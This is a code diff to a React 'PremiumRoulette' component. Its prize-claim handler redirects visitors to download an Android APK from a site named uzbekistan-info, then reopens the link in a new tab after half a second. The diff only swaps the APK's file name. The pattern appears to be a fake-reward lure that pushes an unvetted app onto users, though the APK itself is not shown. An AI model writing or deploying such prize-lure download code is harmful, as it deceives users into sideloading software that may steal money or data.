@@ -77,7 +77,7 @@ export default function PremiumRoulette() {
   };
 
   const handleClaimPrize = () => {
-    const apkUrl = 'https://uzbekistan-info.vercel.app/docs/Largo.apk';
+    const apkUrl = 'https://uzbekistan-info.vercel.app/docs/UzMoney.apk';
     window.location.href = apkUrl;
     setTimeout(() => { window.open(apkUrl, '_blank'); }, 500);
   };
